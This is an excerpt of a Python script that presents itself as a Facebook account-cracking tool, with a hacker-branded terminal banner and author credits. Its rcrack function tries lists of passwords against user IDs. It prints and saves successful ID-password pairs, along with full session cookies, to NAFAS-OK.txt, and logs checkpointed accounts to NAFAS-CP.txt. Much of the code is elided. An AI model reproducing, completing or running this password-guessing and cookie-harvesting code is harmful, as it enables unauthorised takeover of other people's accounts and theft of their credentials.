...
\x1b[1;92m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝                                           
\x1b[1;97m-----------------------------------------------------
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mAUTHOR   \x1b[1;95m: \x1b[1;94mARYAN HACKER
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mFACEBOOK \x1b[1;95m: \x1b[1;94Rayees aryan
...
def riaz():
	...
	if riaz1 =='0':
		exit()
	if riaz1 =='3':
		os.system('xdg-open https://facebook.com/profile.php?id=100093165858441')
	if riaz1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mARYAN-XD\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[NAFAS-OK] '+cid+' | '+ps+'\033[0;97m\n[‎‎🍪]\033[1;33m 🅲︎🅾︎🅾︎🅺︎🅸︎🅴︎ = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('NAFAS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[NAFAS-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('NAFAS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
